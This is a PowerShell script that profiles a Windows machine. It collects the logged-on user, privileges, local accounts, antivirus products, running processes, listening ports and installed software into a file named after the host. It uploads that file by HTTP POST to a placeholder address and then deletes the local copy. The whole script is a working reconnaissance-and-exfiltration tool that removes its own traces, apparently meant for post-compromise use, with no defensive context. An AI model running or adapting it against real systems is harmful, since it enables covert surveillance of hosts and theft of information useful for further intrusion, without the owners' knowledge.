$x = Join-Path $env:APPDATA ""
$ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
$currentTime = Get-Date -Format "MM-dd-yyyy_HH-mm"
$hostname = $env:COMPUTERNAME
$fileName = "$hostname-$ipAddress-$currentTime.txt"
$srcPath = Join-Path $x $fileName
$append = Out-File -FilePath $srcPath -Append

# Ensure the directory exists
if (-not (Test-Path $x)) {
    New-Item -ItemType Directory -Path $x | Out-Null
}

# cim version of get logged user
"The current logged on user:" | Out-File -FilePath $srcPath
$userlogged = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$userlogged | Out-File -FilePath $srcPath -Append
"" | Out-File -FilePath $srcPath -Append

# net user
$userdetail = cmd.exe /c net user $env:USERNAME
$userdetail | Out-File -FilePath $srcPath -Append
"" | Out-File -FilePath $srcPath -Append

#userprivs - couldn't find a good powershell way to do this
$priv = cmd.exe /c whoami /priv | Out-File -FilePath $srcPath -Append
"" | Out-File -FilePath $srcPath -Append

#all users
"Users on this machine:" | Out-File -FilePath $srcPath -Append
$allusers = Get-WmiObject Win32_UserAccount | Select-Object Name,Description,Domain,SID | Format-Table -AutoSize
$allusers | Out-File -FilePath $srcPath -Append

"The last boot time was: $((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)" | Out-File -FilePath $srcPath -Append
(Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture) | Out-File -FilePath $srcPath -Append
Get-WmiObject -Class Win32_ComputerSystem | Out-File -FilePath $srcPath -Append
$pcSystemType = (Get-WmiObject -Class Win32_ComputerSystem).PCSystemType

"Checking the system type:" | Out-File -FilePath $srcPath -Append
switch ($pcSystemType) {
    0 { "The system type is unspecified." | Out-File -FilePath $srcPath -Append }
    1 { "The system is a desktop." | Out-File -FilePath $srcPath -Append }
    2 { "The system is a laptop (mobile)." | Out-File -FilePath $srcPath -Append }
    3 { "The system is a workstation." | Out-File -FilePath $srcPath -Append }
    4 { "The system is an enterprise server." | Out-File -FilePath $srcPath -Append }
    5 { "The system is a SOHO (Small Office/Home Office) server." | Out-File -FilePath $srcPath -Append }
    6 { "The system is an appliance PC." | Out-File -FilePath $srcPath -Append }
    7 { "The system is a performance server." | Out-File -FilePath $srcPath -Append }
    8 { "The system type is reserved (maximum value)." | Out-File -FilePath $srcPath -Append }
    default { "The system type is unknown." | Out-File -FilePath $srcPath -Append }
}
"" | Out-File -FilePath $srcPath -Append

"Current Anti-Virus Software:" | Out-File -FilePath $srcPath -Append
(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName | Out-File -FilePath $srcPath -Append
(Get-WmiObject Win32_OperatingSystem).InstallDate | Out-File -FilePath $srcPath -Append
"" | Out-File -FilePath $srcPath -Append


"The running processes are:" | Out-File -FilePath $srcPath -Append
$processes = Get-Process 
$processes | Out-File -FilePath $srcPath -Append

"The listening ports are:" | Out-File -FilePath $srcPath -Append
$ports = Get-NetTCPConnection -State Listen
$ports | Out-File -FilePath $srcPath -Append

"The following are installed applications:" | Out-File -FilePath $srcPath -Append
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | Where-Object { $_.DisplayName -ne $null } | Sort-Object -Property DisplayName -Unique | Format-Table -AutoSize | Out-String | Out-File -FilePath $srcPath -Append

#file transfer
$SourceFilePath = $srcPath
$SiteAddress = "http://127.0.0.1/upload"

Function Upload-File { 
    Param (
        [string]$File, 
        [string]$URI
    )
    $WebClient = New-Object System.Net.WebClient
    ("*** Uploading {0} file to {1} ***" -f ($File, $URI)) | Write-Host -ForegroundColor Green
    
    # Create a dictionary for multipart form-data
    $boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    $LF = "`r`n"
    $body = "--$boundary$LF"
    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"$LF"
    $body += "Content-Type: text/plain$LF$LF"
    $body += [System.IO.File]::ReadAllText($File) + "$LF"
    $body += "--$boundary--$LF"
    
    # Convert body to byte array
    $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($body)
    
    # Send the request
    $WebClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
    $WebClient.UploadData($URI, "POST", $bodyBytes)
} 

# Upload the file
Upload-File -File $SourceFilePath -URI $SiteAddress

#remove the file
ri $srcPath